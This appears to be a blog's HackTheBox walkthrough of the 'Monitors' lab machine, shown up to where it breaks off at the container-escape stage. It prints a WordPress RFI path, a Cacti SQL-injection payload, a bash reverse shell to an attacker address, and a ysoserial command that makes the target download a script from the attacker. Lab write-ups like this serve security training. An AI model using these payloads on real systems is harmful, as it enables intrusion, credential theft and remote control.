<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox Monitors" /><meta property="og:locale" content="en" /><meta name="description" content="Machine Information Monitors is a hard difficulty machine that starts with a vulnerable RFI plugin on a WordPress site. I acquire information on different vHosts hosting vulnerable cactus after some enumeration, which leads to code execution through SQL command. From there, I went to user and discovered a docker container running the vulnerable Apache OFbiz, which I exploited by installing a malicious kernel module and gaining root access to the host." /><meta property="og:description" content="Machine Information Monitors is a hard difficulty machine that starts with a vulnerable RFI plugin on a WordPress site. I acquire information on different vHosts hosting vulnerable cactus after some enumeration, which leads to code execution through SQL command. From there, I went to user and discovered a docker container running the vulnerable Apache OFbiz, which I exploited by installing a malicious kernel module and gaining root access to the host." /><link rel="canonical" href="https://am-root.github.io/posts/HTB-Monitors/" /><meta property="og:url" content="https://am-root.github.io/posts/HTB-Monitors/" /><meta property="og:site_name" content="amroot" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-31T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox Monitors" /><meta name="twitter:site" content="@_amroot" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"mainEntityOfPage":{"@type":"WebPage","@id":"https://am-root.github.io/posts/HTB-Monitors/"},"description":"Machine Information Monitors is a hard difficulty machine that starts with a vulnerable RFI plugin on a WordPress site. I acquire information on different vHosts hosting vulnerable cactus after some enumeration, which leads to code execution through SQL command. From there, I went to user and discovered a docker container running the vulnerable Apache OFbiz, which I exploited by installing a malicious kernel module and gaining root access to the host.","url":"https://am-root.github.io/posts/HTB-Monitors/","@type":"BlogPosting","headline":"HackTheBox Monitors","dateModified":"2021-10-31T00:00:00+00:00","datePublished":"2021-10-31T00:00:00+00:00","@context":"https://schema.org"}</script><title>HackTheBox Monitors | amroot</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="amroot"><meta name="application-name" content="amroot"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/hacker.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">amroot</a></div><div class="site-subtitle font-italic">CTF writeups and Infosec blogs</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/am-root" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_amroot" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['janakskhairmode','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/amroot" aria-label="linkedin" class="order-6" > <i class="fab fa-linkedin"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox Monitors</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox Monitors</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Janak Khairmode </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Oct 31, 2021, 12:00 AM +0000" >Oct 31, 2021<i class="unloaded">2021-10-31T00:00:00+00:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1849 words">10 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-proofer-ignore data-src="/image/hackthebox/monitors/monitorsinfocard.png" class="preview-img" alt="monitorsinfocard" width="1000" height="400"><h1 id="machine-information">Machine Information</h1><p>Monitors is a hard difficulty machine that starts with a vulnerable RFI plugin on a WordPress site. I acquire information on different vHosts hosting vulnerable cactus after some enumeration, which leads to code execution through SQL command. From there, I went to user and discovered a docker container running the vulnerable Apache OFbiz, which I exploited by installing a malicious kernel module and gaining root access to the host.</p><h1 id="enumeration">Enumeration</h1><h2 id="nmap">Nmap</h2><p><code class="language-plaintext highlighter-rouge">nmap</code> is a is a network scanner. With feeding this an IP you can scan for its open ports and services running on it. This tool is exalted for its positive results in the InfoSec community.</p><p>Lets start using it, <code class="language-plaintext highlighter-rouge">sudo nmap -p- -oA nmap/all 10.10.10.238 --min-rate=10000</code> Here, <code class="language-plaintext highlighter-rouge">-p-</code> : Specifies All ports 0-65535 <code class="language-plaintext highlighter-rouge">-oA</code> : To print output into files with extensions gnmap,xml,nmap, Here A stands for All. <code class="language-plaintext highlighter-rouge">--min-rate=</code> : When the –min-rate option is given Nmap will do its best to send packets as fast as or faster than the given rate. And I got the following result,</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>Nmap scan report <span class="k">for </span>10.10.10.238
Host is up <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>307.22 seconds
</pre></table></code></div></div><p>Now I scan them to identify running services and nmap pre-installed scripts using <code class="language-plaintext highlighter-rouge">-sV</code> and <code class="language-plaintext highlighter-rouge">-sC</code> flags respectively.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>Nmap scan report <span class="k">for </span>10.10.10.238
Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e <span class="o">(</span>RSA<span class="o">)</span>
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Site doesn<span class="se">\'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.21 seconds
</pre></table></code></div></div><p>So there are only 2 ports are open,</p><ol><li><code class="language-plaintext highlighter-rouge">22 - ssh</code> : OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<li><code class="language-plaintext highlighter-rouge">80 - http</code> : Apache httpd 2.4.29</ol><p>After googling these version the potential host is Ubuntu 18.04 Bionic. Not that it matters for now!</p><h1 id="visiting-port-80">Visiting Port 80</h1><p>The web page looks like this,</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019200541538.png" alt="image-20211019200541538" /></p><p>Since it is saying monitors.htb, I added it to the host file <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><blockquote><p>10.10.10.238 monitors.htb</p></blockquote><p>I started to look for any esoteric VHosts using <code class="language-plaintext highlighter-rouge">ffuf</code>, Fuzz Faster U Fool (ffuf) is a Fuzzer written in GO language <a href="https://github.com/ffuf/ffuf">read it here</a>, by following command: <code class="language-plaintext highlighter-rouge">ffuf -u http://monitors.htb -w /opt/Tools/SecLists/Discovery/Web-Content/raft-small-words.txt -H "Host: FUZZ.monitors.htb" -fl 1</code></p><p>Here,</p><ol><li><code class="language-plaintext highlighter-rouge">-u</code> : refers to URL to scan<li><code class="language-plaintext highlighter-rouge">-w</code> : Wordlist containing some spicy words<li><code class="language-plaintext highlighter-rouge">-H</code> : To edit and send header to scan Hosts with FUZZ keyword<li><code class="language-plaintext highlighter-rouge">-fl</code> : Refers to Filter Line</ol><p>This is how the site looks after adding hostname to host file.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019200617529.png" alt="image-20211019200617529" /></p><p>At the bottom, It is saying Wordpress. So I ran <code class="language-plaintext highlighter-rouge">wpscan</code> against the website, with following flags: <code class="language-plaintext highlighter-rouge">wpscan --url http://monitors.htb/ -e ap --detection-mode aggressive -v</code></p><ol><li><code class="language-plaintext highlighter-rouge">--url</code> : URL to scan<li><code class="language-plaintext highlighter-rouge">-e ap</code> : This will enumerate all plugins that are used in the site.<li><code class="language-plaintext highlighter-rouge">--detection-mode aggressive</code> : Will scan for information more aggressively.<li><code class="language-plaintext highlighter-rouge">-v</code> : This will print verbosely</ol><p>The tool has given quite an information but interesting is the <code class="language-plaintext highlighter-rouge">wp-with-spritz</code> plugin.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019200641285.png" alt="image-20211019200641285" /></p><h2 id="rfi-on-plugin">RFI on Plugin</h2><p>So, The plugin is vulnerable to RFI. I search for this plugin under <code class="language-plaintext highlighter-rouge">searchsploit</code> it gave me <code class="language-plaintext highlighter-rouge">44544.php</code> this file explaining the Proof of Concept for this exploit.</p><blockquote><p>if(isset($_GET[‘url’])){ $content=file_get_contents($_GET[‘url’]);</p></blockquote><p>Above code is present inside the plugin file, and POC explains to ways to extract information,</p><blockquote><ol><li>/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd<li>/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec</ol></blockquote><p>I tried first and successfully got <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, I also tried to extract <code class="language-plaintext highlighter-rouge">.ssh/id_rsa</code> from user’s home directory but server only replied with empty page. At this point I am Assuming user did not have ssh login configured for himself or some permission is blocking the contents.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019200709983.png" alt="image-20211019200709983" /></p><p>I looked at the <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code> and it showed two config files on on respective VHosts, there is one VHost that was hiding in the dark.</p><ol><li>monitors.htb.conf<li>cacti-admin.monitors.htb.conf</ol><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019200758003.png" alt="image-20211019200758003" /></p><p>I added it to a host file.</p><blockquote><p>10.10.10.238 monitors.htb cacti-admin.monitors.htb cacti</p></blockquote><p>And visited the site. Below is the face of it.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019200858965.png" alt="image-20211019200858965" /></p><p>I tried the dictionary attack against it, but none of it gave fructive result. So I started to enumerate for credentials. This time I hunt for wordpress config file residing in <code class="language-plaintext highlighter-rouge">/var/www/wordpress/wp-config.php</code>, and I get username as well as password.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019200936155.png" alt="image-20211019200936155" /></p><p>I used those <code class="language-plaintext highlighter-rouge">wpadmin:BestAdministrator@2020!</code> credentials to login onto the portal, after just changing <code class="language-plaintext highlighter-rouge">wpadmin</code> to <code class="language-plaintext highlighter-rouge">admin</code> I was successfull in logging in.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201010605.png" alt="image-20211019201010605" /></p><p>Above image shows post logging-in page with <code class="language-plaintext highlighter-rouge">Version 1.2.12</code> indicated on the top right side, <code class="language-plaintext highlighter-rouge">searchsploit</code> shows this version is exploitable to <code class="language-plaintext highlighter-rouge">'filter' SQL Injection / Remote Code Execution</code>. Refering the <code class="language-plaintext highlighter-rouge">49810.py</code> for POC, It says that <code class="language-plaintext highlighter-rouge">/cacti/color.php?action=export&amp;header=false&amp;filter=1</code> is vulnerable, but you have to visit <code class="language-plaintext highlighter-rouge">/cacti/host.php?action=reindex</code> to trigger the payload. The Payload is used in 3 chunks <code class="language-plaintext highlighter-rouge">')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{rshell};'+where+name='path_php_binary';--+-</code></p><p>Using first chunk I am able to get credentials of users,</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201039188.png" alt="image-20211019201039188" /></p><p>Which means exploit Indeed this works in this machine but before doing that lets ping to our machine. So, the payload for ping is <code class="language-plaintext highlighter-rouge">')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='ping+-n+2+10.10.14.31;'+where+name='path_php_binary';--+-</code></p><p>As you can see we get a ping back.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201106535.png" alt="image-20211019201106535" /></p><p>Now, lets try to get reverse shell. But I was getting nothing back this time. Not sure what happened so I reboot the box and sent the payload again,this time I get reverse shell as <code class="language-plaintext highlighter-rouge">www-data</code> user.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201133153.png" alt="image-20211019201133153" /></p><p>Now let’s get proper shell with <code class="language-plaintext highlighter-rouge">python3</code> as follows:</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201158049.png" alt="image-20211019201158049" /></p><p>So there was <code class="language-plaintext highlighter-rouge">/usr/share/cacti/cacti/include/config.php</code> files in which some credentials was store, I used them to login into mysql service but my request was declined.</p><blockquote><p>ERROR 1045 (28000): Access denied for user ‘cacti’@’localhost’ (using password: YES)</p></blockquote><p>I started to poke around the machine to see any handy information leading to anywhere. In <code class="language-plaintext highlighter-rouge">/home/marcus/</code> directory, <code class="language-plaintext highlighter-rouge">.backup/</code> and <code class="language-plaintext highlighter-rouge">notes.txt</code> was throwing <code class="language-plaintext highlighter-rouge">Permission denied</code> errors. Now exploiring again and I find interesting service running inside <code class="language-plaintext highlighter-rouge">/etc/systemd/system/</code> and we as a user can read this file.</p><blockquote><p>lrwxrwxrwx 1 root root 40 Nov 10 2020 cacti-backup.service -&gt; /lib/systemd/system/cacti-backup.service</p></blockquote><p>Here <code class="language-plaintext highlighter-rouge">l</code> in <code class="language-plaintext highlighter-rouge">lrwxrwxrwx</code> defines symbolic link. Inside the file:</p><blockquote><p>[Unit]<br /> Description=Cacti Backup Service<br /> After=network.target<br /> [Service]<br /> Type=oneshot<br /> User=www-data<br /> ExecStart=/home/marcus/.backup/backup.sh<br /> [Install]<br /> WantedBy=multi-user.target\</p></blockquote><p>I can read <code class="language-plaintext highlighter-rouge">/home/marcus/.backup/backup.sh</code> file since it is owned by <code class="language-plaintext highlighter-rouge">www-data</code> user.</p><p>Inside <code class="language-plaintext highlighter-rouge">backup.sh</code> file:</p><blockquote><p>#!/bin/bash<br /> backup_name=”cacti_backup”<br /> config_pass=”VerticalEdge2020”<br /> zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*<br /> sshpass -p “${config_pass}” scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip<br /> rm /tmp/${backup_name}.zip\</p></blockquote><p>I tried logging in with our <code class="language-plaintext highlighter-rouge">python3</code> shell from <code class="language-plaintext highlighter-rouge">su marcus -</code> command but it was giving error. So, I logged in through SSH.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201228004.png" alt="image-20211019201228004" /></p><p>There is a <code class="language-plaintext highlighter-rouge">note.txt</code> file residing in user’s home directory and it is a TO-DO list to update docker image file which is unchecked. It hints that I might be inside docker container or I have to enumerate more on how container.</p><blockquote><p>marcus@monitors:~$ cat note.txt TODO:<br /> <br /> Disable phpinfo in php.ini - DONE<br /> Update docker image for production use -</p></blockquote><p>I ran <code class="language-plaintext highlighter-rouge">deepce.sh</code>, it says that we are not inside container. Also there is not <code class="language-plaintext highlighter-rouge">/.docker/</code> directory inside root directory. So, It’s time to get more infomation about this machine.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201248798.png" alt="image-20211019201248798" /></p><p>I looked for any local port listening and there are two <code class="language-plaintext highlighter-rouge">8443</code> and <code class="language-plaintext highlighter-rouge">3306</code> ports listening.</p><ol><li><code class="language-plaintext highlighter-rouge">8443</code> - I have no clue on what service this port is using.<li><code class="language-plaintext highlighter-rouge">3306</code> - Usually, MySql uses this port.</ol><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201337309.png" alt="image-20211019201337309" /></p><p>I tried logging in using <code class="language-plaintext highlighter-rouge">marcus</code> credentials on <code class="language-plaintext highlighter-rouge">mysql</code> service but I get access denied.</p><h1 id="port-8443">Port 8443</h1><p>Since the machine does not have <code class="language-plaintext highlighter-rouge">wget</code> or <code class="language-plaintext highlighter-rouge">curl</code> I can not directly interact with the port. I have to use SSH port forwarding to access the port. To forward port on just type <code class="language-plaintext highlighter-rouge">~C</code> on fresh terminal.</p><blockquote><p>marcus@monitors:~$ <br /> ssh&gt; -L 8443:127.0.0.1:8443<br /> Forwarding port.</p></blockquote><ol><li><code class="language-plaintext highlighter-rouge">-L</code> - So any traffic hitting my 8443 port will be forwarded to Monitor’s 8443 port. <code class="language-plaintext highlighter-rouge">myport:destination:port-to-forward</code></ol><p>Visiting the page it says TLS is required, Now we jump from <code class="language-plaintext highlighter-rouge">http</code> to <code class="language-plaintext highlighter-rouge">https</code>.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201400007.png" alt="image-20211019201400007" /></p><p>I have started <code class="language-plaintext highlighter-rouge">ffuf</code> to look for any exclusive directory that will lead me closer to knowing service and I get <code class="language-plaintext highlighter-rouge">myportal</code> directory.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201422940.png" alt="image-20211019201422940" /></p><p>I visted the path which redirected me to login portal, At the bottom you can see it is <code class="language-plaintext highlighter-rouge">Apache OFbiz v17.12.01</code>.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019201446105.png" alt="image-20211019201446105" /></p><p>Running this version under <code class="language-plaintext highlighter-rouge">searchploit</code> provided <code class="language-plaintext highlighter-rouge">ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments</code> exploit.</p><h1 id="apache-ofbiz">Apache OFbiz</h1><p>The vulnerabilty explainaion from <a href="https://www.zerodayinitiative.com/blog/2020/9/14/cve-2020-9496-rce-in-apache-ofbiz-xmlrpc-via-deserialization-of-untrusted-data">Zero Day Initiative</a> says the vulnerability arrises due to Java serialization issues when processing requests sent to <code class="language-plaintext highlighter-rouge">/webtools/control/xmlrpc</code>. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted request. Successful exploitation would result in arbitrary code execution.</p><p>Visiting <code class="language-plaintext highlighter-rouge">https://localhost:8443/webtools/control/xmlrpc</code> site throws an error.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211019204324255.png" alt="image-20211019204324255" /></p><p>I googled for Apache OFbiz exploit POC 2020-9496 and a bunch of results came. Since they are all same methods on getting a revese shell, I chose for g33xter’s POC. you can follow it on his github profile, <a href="https://github.com/g33xter/CVE-2020-9496">click here</a>.</p><p>POC to getting root:</p><ol><li>First I have created a bash reverse shell file calling it shell.sh .</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>   <span class="c">#!/bin/bash</span>
   /bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.55/9001 0&gt;&amp;1
</pre></table></code></div></div><ol><li><p>Then I downloaded ysoserial.jar file from official repository. you have <a href="https://github.com/frohoff/ysoserial">click here</a> to visit their page.</p><li><p>Now I will generate payload to download shell.sh. It will give out very long base64 encoded payload.</p></ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>   java <span class="nt">-jar</span> ysoserial.jar CommonsBeanutils1 <span class="s2">"wget 10.10.14.55/shell.sh -O /tmp/shell.sh"</span> | <span class="nb">base64</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
</pre></table></code></div></div><ol><li>I will start my python3 server where my shell.sh file is residing.</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>   python3 <span class="nt">-m</span> http.server
</pre></table></code></div></div><ol><li>Then I sent the payload from BurpSuite using provided code from repository.</ol><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211020203220361.png" alt="image-20211020203220361" /></p><ol><li>It hit my python server and got the file successfully.</ol><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211020203245620.png" alt="image-20211020203245620" /></p><ol><li><p>Now I will create new payload to execute bash file downloaded in <code class="language-plaintext highlighter-rouge">/tmp/shell.sh</code> directory. Sent the payload again from burpsuite.</p><li><p>As you can see I successfully got my reverseshell.</p></ol><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211020203354437.png" alt="image-20211020203354437" /></p><p>Looking at the hostname, I am certainly inside a docker, and I have to find a way to get out it.</p><p>This time again after running <code class="language-plaintext highlighter-rouge">deepce.sh</code>, it returned two highlighted capabilities and showed two files inside root directory.</p><p><img data-proofer-ignore data-src="/image/hackthebox/monitors/image-20211021132959675.png" alt="image-20211021132959675" /></p><p>Files are kernel modules;</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">[</span>+] Interesting files <span class="k">in </span>root ........... Yes                                                      
/linux-headers-4.15.0-132_4.15.0-132.136_all.deb                                                                               
/linux-headers-4.15.0-132-generic_4.15.0-132.136_amd64.deb 
